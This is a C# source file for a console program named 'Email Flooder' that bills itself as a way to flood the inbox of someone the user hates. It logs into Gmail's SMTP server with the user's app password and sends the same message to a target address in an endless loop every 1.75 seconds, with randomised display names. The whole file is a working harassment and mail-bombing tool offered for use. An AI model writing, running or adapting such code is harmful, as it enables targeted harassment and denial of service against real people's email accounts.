using System;
using System.Net;
using System.Net.Mail;
using System.Net.NetworkInformation;
using System.Reflection;
using System.Resources;
using System.Runtime.CompilerServices;
using System.Threading;

internal class Program
{
    private static void Main(string[] args)
    {
        if (args.Length <= 1)
        {
            Console.WriteLine("Email Flooder v1.0.2");
            Console.WriteLine("Hate someone? Flood their email!\n");
            Console.WriteLine("Usage:\n");
            Console.WriteLine("EmailFlooder <email to send from> <email to send to>\n");
            Console.WriteLine("Report issues and suggestions at https://github.com/alakhmed/Email-Flooder");
            Console.WriteLine("Contact at uu7s6161y@mozmail.com\n");
            System.Environment.Exit(0);
        }


        Console.WriteLine("When using Google Mail addresses with this program,");
        Console.WriteLine("you must first obtain an app password at https://myaccount.google.com/apppasswords.");
        Console.WriteLine("Enter the app password (password will not be visible): ");
        string fromPassword = null;
        while(true)
        {
            var key = System.Console.ReadKey(true);
            if (key.Key == ConsoleKey.Enter)
                break;
            fromPassword += key.KeyChar;
        }
        Random random = new Random();
        var fromAddress = new MailAddress(args[0], RandomString(64, random));
        var toAddress = new MailAddress(args[1], RandomString(64, random));
        const string subject = "subject line";
        const string body = "this is the body";
        var n = 0;

        var smtp = new SmtpClient

        {
            Host = "smtp.gmail.com",
            Port = 587,
            EnableSsl = true,
            DeliveryMethod = SmtpDeliveryMethod.Network,
            UseDefaultCredentials = false,
            Credentials = new NetworkCredential(fromAddress.Address, fromPassword)
        };
        using (var message = new MailMessage(fromAddress, toAddress)
        {
            Subject = subject,
            Body = body
        })
            for (; ; )
            {
                smtp.Send(message);
                Thread.Sleep(1750);
                Console.WriteLine("[" + n++ + "]       Sent message to " + toAddress.Address);
            }
    }

    private static string RandomString(int length, Random random)
    {
        const string chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
        return new string(Enumerable.Repeat(chars, length)
            .Select(s => s[random.Next(s.Length)]).ToArray());
    }
}